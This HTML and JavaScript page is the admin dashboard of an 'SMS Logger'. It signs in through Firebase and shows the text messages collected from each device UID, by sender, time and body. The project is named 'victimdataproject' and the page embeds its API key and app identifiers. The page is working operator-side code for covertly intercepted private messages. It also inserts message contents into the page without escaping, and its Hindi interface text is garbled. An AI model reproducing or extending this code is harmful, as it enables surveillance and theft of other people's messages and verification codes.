<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Logger Admin Panel - Login</title>
    <!-- Firebase App (Core) SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <!-- Firebase Realtime Database SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <!-- Firebase Authentication SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>

    <style>
        /* CSS Styles: Modern Light Theme with Blue Accent */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            background-color: #f4f6f8; /* Light grey background */
            color: #333; /* Dark text */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            line-height: 1.6;
        }

        .auth-container, .dashboard-container {
            width: 100%;
            background-color: #ffffff; /* White container background */
            padding: 30px; /* Increased padding */
            border-radius: 12px; /* More rounded corners */
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); /* Softer shadow */
            margin: 20px;
        }
        
        .auth-container {
             max-width: 450px; /* Slightly wider login form */
        }
        .dashboard-container {
            max-width: 950px;
        }

        h1, h2 {
            color: #007bff; /* Primary blue accent */
            text-align: center;
            border-bottom: 2px solid #007bff;
            padding-bottom: 15px; /* Increased padding */
            margin-bottom: 25px; /* Increased margin */
            font-weight: 600;
        }
        h1 { font-size: 2em; }
        h2 { font-size: 1.6em; }


        .form-group {
            margin-bottom: 20px; /* Increased margin */
        }

        .form-group label {
            display: block;
            margin-bottom: 8px; /* Increased margin */
            color: #555; /* Medium grey for labels */
            font-weight: 500;
        }

        .form-group input[type="email"],
        .form-group input[type="password"] {
            width: calc(100% - 24px); /* Account for padding and border */
            padding: 12px; /* Increased padding */
            border-radius: 6px; /* Smoother border radius */
            border: 1px solid #ced4da; /* Standard input border */
            background-color: #fdfdfd; /* Slightly off-white input background */
            color: #333;
            font-size: 1em;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .form-group input[type="email"]:focus,
        .form-group input[type="password"]:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
            outline: none;
        }

        button {
            background-color: #007bff; /* Primary blue */
            color: white;
            padding: 12px 20px; /* Adjusted padding */
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 1.05em; /* Slightly larger font */
            font-weight: 500;
            transition: background-color 0.2s ease, transform 0.1s ease;
            width: 100%;
            text-transform: uppercase; /* Uppercase text for buttons */
            letter-spacing: 0.5px;
        }

        button:hover {
            background-color: #0056b3; /* Darker blue on hover */
            transform: translateY(-1px); /* Slight lift on hover */
        }
        button:active {
            transform: translateY(0px); /* Press down effect */
        }

        #logoutButton {
            background-color: #dc3545; /* Standard red for danger/logout */
            margin-top: 25px;
        }
        #logoutButton:hover {
            background-color: #c82333; /* Darker red on hover */
        }

        .error-message {
            color: #dc3545; /* Red for error messages */
            background-color: #f8d7da; /* Light red background for error */
            border: 1px solid #f5c6cb;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            margin-bottom: 20px;
            font-size: 0.9em;
        }
        .error-message:empty { /* Hide if no error text */
            display: none;
        }


        .controls {
            display: flex;
            align-items: center;
            gap: 20px; /* Increased gap */
            margin-bottom: 30px; /* Increased margin */
            padding: 20px; /* Increased padding */
            background-color: #e9ecef; /* Light grey for controls background */
            border-radius: 8px;
        }

        .controls label {
            font-weight: 600; /* Bolder label */
            color: #007bff; /* Blue accent */
        }

        select#deviceSelector {
            flex-grow: 1;
            padding: 12px; /* Increased padding */
            border-radius: 6px;
            border: 1px solid #ced4da;
            background-color: #fff;
            color: #333;
            font-size: 1em;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        select#deviceSelector:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
            outline: none;
        }


        #messagesList {
            list-style-type: none;
            padding: 0;
        }

        #messagesList li {
            background-color: #fff;
            border: 1px solid #e0e0e0; /* Lighter border */
            border-left: 5px solid #007bff; /* Blue accent on the left */
            padding: 18px; /* Increased padding */
            margin-bottom: 15px; /* Increased margin */
            border-radius: 8px; /* More rounded */
            box-shadow: 0 2px 8px rgba(0,0,0,0.07); /* Subtle shadow */
            word-wrap: break-word;
        }

        #messagesList li strong {
            color: #0056b3; /* Darker blue for sender/date */
            display: block;
            margin-bottom: 6px; /* Increased margin */
            font-weight: 600;
        }

        #messagesList li .message-body {
            margin-top: 10px; /* Increased margin */
            white-space: pre-wrap;
            color: #444; /* Slightly lighter text for message body */
        }
        
        #loadingIndicator, #initialLoadingAdmin {
            text-align: center;
            padding: 25px; /* Increased padding */
            font-style: italic;
            color: #777; /* Medium grey */
            font-size: 1.1em;
        }

        /* Hide dashboard initially */
        .dashboard-container {
            display: none;
        }

        /* Mobile Responsiveness */
        @media (max-width: 768px) { /* Adjusted breakpoint */
            .auth-container, .dashboard-container {
                padding: 20px;
                margin: 15px;
            }
            .controls {
                flex-direction: column;
                align-items: stretch;
            }
            select#deviceSelector {
                width: 100%;
            }
            h1 { font-size: 1.8em; }
            h2 { font-size: 1.4em; }
        }
    </style>
</head>
<body>
    <div id="initialLoadingAdmin">Admin Panel ‡§≤‡•ã‡§° ‡§π‡•ã ‡§∞‡§π‡§æ ‡§π‡•à...</div>

    <div class="auth-container" id="loginContainer">
        <h2>üîí ‡§è‡§°‡§Æ‡§ø‡§® ‡§≤‡•â‡§ó‡§ø‡§®</h2>
        <div id="loginError" class="error-message"></div>
        <div class="form-group">
            <label for="email">‡§à‡§Æ‡•á‡§≤:</label>
            <input type="email" id="email" required placeholder="apka@email.com">
        </div>
        <div class="form-group">
            <label for="password">‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°:</label>
            <input type="password" id="password" required placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢">
        </div>
        <button id="loginButton">‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡•á‡§Ç</button>
    </div>

    <div class="dashboard-container" id="dashboardContainer">
        <h1>üì± SMS Logger - ‡§è‡§°‡§Æ‡§ø‡§® ‡§°‡•à‡§∂‡§¨‡•ã‡§∞‡•ç‡§° üõ°Ô∏è</h1>
        <div class="controls">
            <label for="deviceSelector">‡§°‡§ø‡§µ‡§æ‡§á‡§∏ UID:</label>
            <select id="deviceSelector">
                <option value="">-- ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§ö‡•Å‡§®‡•á‡§Ç --</option>
            </select>
        </div>
        
        <div id="loadingIndicator" style="display: none;">‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§≤‡•ã‡§° ‡§π‡•ã ‡§∞‡§π‡•á ‡§π‡•à‡§Ç...</div>
        <ul id="messagesList">
            <!-- Messages yahan display honge -->
        </ul>
        <button id="logoutButton">‡§≤‡•â‡§ó‡§Ü‡§â‡§ü ‡§ï‡§∞‡•á‡§Ç</button>
    </div>

    <script>
        // Hindi Comment: Yeh JavaScript code Firebase se connect karega, admin login handle karega aur data display karega.

        // Part 1: Firebase Configuration
        // Hindi Comment: Yeh Firebase project ki configuration hai. Aapki di hui Web App ID yahan daal di gayi hai.
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw", // Aapka Web API Key
            authDomain: "victimdataproject.firebaseapp.com", // Aapka Project ID + .firebaseapp.com
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/", // Aapka Database URL
            projectId: "victimdataproject", // Aapka Project ID
            storageBucket: "victimdataproject.appspot.com", // Aapka Storage Bucket
            messagingSenderId: "938788267301", // Aapka Project Number (Messaging Sender ID)
            appId: "1:938788267301:web:cdcff391160dce48fa66cc" // Aapki di hui Web App ID
        };

        // Initialize Firebase
        // Hindi Comment: Firebase ko initialize kar rahe hain.
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth(); // Firebase Auth ka instance
        const database = firebase.database(); // Realtime Database ka instance

        // DOM Elements
        // Hindi Comment: HTML elements ko JavaScript mein access karne ke liye variables.
        const loginContainer = document.getElementById('loginContainer');
        const dashboardContainer = document.getElementById('dashboardContainer');
        const loginButton = document.getElementById('loginButton');
        const logoutButton = document.getElementById('logoutButton');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const loginError = document.getElementById('loginError');
        const deviceSelector = document.getElementById('deviceSelector');
        const messagesList = document.getElementById('messagesList');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const initialLoadingAdmin = document.getElementById('initialLoadingAdmin');
        
        let currentDeviceUID = null;
        let messagesListener = null;

        // Function to handle Login
        // Hindi Comment: Yeh function admin ke login attempt ko handle karega.
        loginButton.addEventListener('click', () => {
            const email = emailInput.value;
            const password = passwordInput.value;
            loginError.textContent = ''; // Purana error message clear karein

            if (!email || !password) {
                loginError.textContent = '‡§à‡§Æ‡•á‡§≤ ‡§î‡§∞ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à‡§Ç‡•§';
                return;
            }
            // Show some loading indication on the button itself
            loginButton.textContent = '‡§≤‡•â‡§ó‡§ø‡§® ‡§π‡•ã ‡§∞‡§π‡§æ ‡§π‡•à...';
            loginButton.disabled = true;


            auth.signInWithEmailAndPassword(email, password)
                .then((userCredential) => {
                    // Login successful - onAuthStateChanged will handle UI update
                    console.log("Admin logged in:", userCredential.user.uid);
                    // No need to reset button here, onAuthStateChanged will hide login form
                })
                .catch((error) => {
                    loginError.textContent = "‡§≤‡•â‡§ó‡§ø‡§® ‡§µ‡§ø‡§´‡§≤: " + getFriendlyErrorMessage(error);
                    console.error("Login Error:", error);
                })
                .finally(() => {
                    // Reset button state only if login failed (or if you want to allow retry)
                     if (!auth.currentUser) { // Check if login actually failed
                        loginButton.textContent = '‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡•á‡§Ç';
                        loginButton.disabled = false;
                     }
                });
        });
        
        // Helper function for user-friendly error messages
        function getFriendlyErrorMessage(error) {
            switch (error.code) {
                case 'auth/invalid-email':
                    return '‡§à‡§Æ‡•á‡§≤ ‡§ï‡§æ ‡§™‡•ç‡§∞‡§æ‡§∞‡•Ç‡§™ ‡§ó‡§≤‡§§ ‡§π‡•à‡•§';
                case 'auth/user-not-found':
                    return '‡§á‡§∏ ‡§à‡§Æ‡•á‡§≤ ‡§∏‡•á ‡§ï‡•ã‡§à ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§';
                case 'auth/wrong-password':
                    return '‡§ó‡§≤‡§§ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°‡•§ ‡§ï‡•É‡§™‡§Ø‡§æ ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç‡•§';
                case 'auth/network-request-failed':
                    return '‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø‡•§ ‡§ï‡•É‡§™‡§Ø‡§æ ‡§Ö‡§™‡§®‡§æ ‡§á‡§Ç‡§ü‡§∞‡§®‡•á‡§ü ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç‡•§';
                default:
                    return error.message; // Default Firebase error message
            }
        }


        // Function to handle Logout
        // Hindi Comment: Yeh function admin ko logout karega.
        logoutButton.addEventListener('click', () => {
            auth.signOut().then(() => {
                // Sign-out successful.
                console.log("Admin logged out");
                // Clear data that should not persist after logout
                deviceSelector.innerHTML = '<option value="">-- ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§ö‡•Å‡§®‡•á‡§Ç --</option>';
                messagesList.innerHTML = '';
                if (messagesListener && currentDeviceUID) {
                    database.ref(`messages/${currentDeviceUID}`).off('value', messagesListener);
                }
                currentDeviceUID = null;
                messagesListener = null;
                // onAuthStateChanged will handle UI update (show login form)
            }).catch((error) => {
                console.error("Logout Error:", error);
                alert("Logout failed: " + error.message);
            });
        });

        // Auth State Observer
        // Hindi Comment: Yeh function user ke login state (login hai ya nahi) ko check karta rehta hai.
        auth.onAuthStateChanged((user) => {
            initialLoadingAdmin.style.display = 'none'; // Hide initial loading message
            if (user) {
                // User (Admin) is signed in.
                loginContainer.style.display = 'none';
                dashboardContainer.style.display = 'block';
                // Reset login button (if it was in loading state and auth changed due to session persistence)
                loginButton.textContent = '‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡•á‡§Ç';
                loginButton.disabled = false;
                loadDeviceUIDs(); // Admin login hone ke baad UIDs load karein
            } else {
                // User is signed out.
                loginContainer.style.display = 'block';
                dashboardContainer.style.display = 'none';
                // Ensure login button is in its default state
                loginButton.textContent = '‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡•á‡§Ç';
                loginButton.disabled = false;
                emailInput.value = ''; // Clear email field on logout
                passwordInput.value = ''; // Clear password field on logout
            }
        });

        // Function to fetch and display device UIDs
        // Hindi Comment: Yeh function Firebase se sabhi device UIDs laayega aur dropdown mein daalega.
        function loadDeviceUIDs() {
            const devicesRef = database.ref('messages');
            // Detach any previous listener on devicesRef to avoid multiple triggers if loadDeviceUIDs is called again
            devicesRef.off(); // Detaches all 'value' listeners from this specific ref if any were there

            devicesRef.on('value', (snapshot) => {
                const oldSelectedUID = deviceSelector.value;
                deviceSelector.innerHTML = '<option value="">-- ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§ö‡•Å‡§®‡•á‡§Ç --</option>';
                messagesList.innerHTML = ''; // Clear messages when UIDs reload

                if (snapshot.exists()) {
                    snapshot.forEach((childSnapshot) => {
                        const uid = childSnapshot.key;
                        const option = document.createElement('option');
                        option.value = uid;
                        option.textContent = uid.substring(0, 15) + '...'; // Show truncated UID for better display
                        option.title = uid; // Full UID on hover
                        deviceSelector.appendChild(option);
                    });
                    
                    if (Array.from(deviceSelector.options).some(opt => opt.value === oldSelectedUID)) {
                        deviceSelector.value = oldSelectedUID;
                        if (oldSelectedUID) displayMessages(oldSelectedUID); // Reload messages for the re-selected UID
                    } else {
                        // If previous selection is gone, or no initial selection
                        currentDeviceUID = null; // Ensure currentDeviceUID is reset
                         if (messagesListener) { // Detach listener if no device selected or old one gone
                            database.ref(`messages/${oldSelectedUID}`).off('value', messagesListener);
                            messagesListener = null;
                        }
                    }

                } else {
                    console.log("No devices found in database. Check Firebase rules and data.");
                    messagesList.innerHTML = '<li>‡§ï‡•ã‡§à ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§ø‡§≤‡§æ ‡§Ø‡§æ ‡§°‡•á‡§ü‡§æ ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ <br>‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø ‡§è‡§°‡§Æ‡§ø‡§® UID ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§®‡§ø‡§Ø‡§Æ‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§∏‡§π‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§∏‡•á‡§ü ‡§π‡•à‡•§</li>';
                }
            }, (error) => {
                console.error("Error loading device UIDs: ", error);
                alert("‡§°‡§ø‡§µ‡§æ‡§á‡§∏ UIDs ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø: " + error.message + ". ‡§ï‡§Ç‡§∏‡•ã‡§≤ ‡§î‡§∞ Firebase ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§®‡§ø‡§Ø‡§Æ (‡§è‡§°‡§Æ‡§ø‡§® UID) ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç‡•§");
                messagesList.innerHTML = `<li>‡§°‡§ø‡§µ‡§æ‡§á‡§∏ UIDs ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø: ${error.message}. <br>‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡§æ ‡§è‡§°‡§Æ‡§ø‡§® UID Firebase ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§®‡§ø‡§Ø‡§Æ‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§∏‡§π‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§∏‡•á‡§ü ‡§π‡•à‡•§</li>`;
            });
        }

        // Function to display messages for a selected UID
        // Hindi Comment: Yeh function select kiye gaye UID ke messages display karega.
        function displayMessages(uid) {
            messagesList.innerHTML = '';
            loadingIndicator.style.display = 'block';

            if (messagesListener && currentDeviceUID && currentDeviceUID !== uid) { // If listener exists for a DIFFERENT UID
                database.ref(`messages/${currentDeviceUID}`).off('value', messagesListener);
            } else if (messagesListener && currentDeviceUID === uid) {
                // Listener already exists for this UID, no need to re-attach, but we want to clear list and show loading
                // This scenario might occur if UIDs are reloaded but same UID is selected.
                // The existing 'on value' listener will handle updates.
            }


            currentDeviceUID = uid;

            if (!uid) {
                loadingIndicator.style.display = 'none';
                if (messagesListener) { // Ensure no listener is active if no UID is selected
                     // This path for currentDeviceUID should already be handled above if it was different
                     // But as a safeguard:
                     // database.ref(`messages/${ uid_that_was_active }`).off('value', messagesListener);
                     messagesListener = null;
                }
                return;
            }

            const messagesRef = database.ref(`messages/${uid}`);
            // Attach new listener or re-use if already on this UID
            messagesListener = messagesRef.orderByChild('timestamp').on('value', (snapshot) => {
                messagesList.innerHTML = ''; // Clear list for fresh data
                loadingIndicator.style.display = 'none';

                if (snapshot.exists()) {
                    let messagesArray = [];
                    snapshot.forEach((messageSnapshot) => {
                        const messageData = messageSnapshot.val();
                        messageData.id = messageSnapshot.key;
                        messagesArray.push(messageData);
                    });

                    messagesArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)); // Newest first

                    messagesArray.forEach((messageData) => {
                        const li = document.createElement('li');
                        const date = messageData.timestamp ? new Date(messageData.timestamp).toLocaleString('hi-IN', { dateStyle: 'medium', timeStyle: 'short'}) : 'N/A';
                        
                        li.innerHTML = `
                            <strong>‡§™‡•ç‡§∞‡•á‡§∑‡§ï:</strong> ${messageData.sender || '‡§Ö‡§ú‡•ç‡§û‡§æ‡§§ ‡§™‡•ç‡§∞‡•á‡§∑‡§ï'}<br>
                            <strong>‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§π‡•Å‡§Ü:</strong> ${date}
                            <div class="message-body">${messageData.body || '‡§ï‡•ã‡§à ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§®‡§π‡•Ä‡§Ç'}</div>
                        `;
                        messagesList.appendChild(li);
                    });
                } else {
                    messagesList.innerHTML = '<li>‡§á‡§∏ ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ã‡§à ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§ø‡§≤‡§æ‡•§</li>';
                }
            }, (error) => {
                console.error(`Error loading messages for UID ${uid}: `, error);
                messagesList.innerHTML = `<li>‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø: ${error.message}.</li>`;
                loadingIndicator.style.display = 'none';
            });
        }

        // Event Listener for device selector change
        deviceSelector.addEventListener('change', (event) => {
            const selectedUID = event.target.value;
            displayMessages(selectedUID);
        });

    </script>
</body>
</html>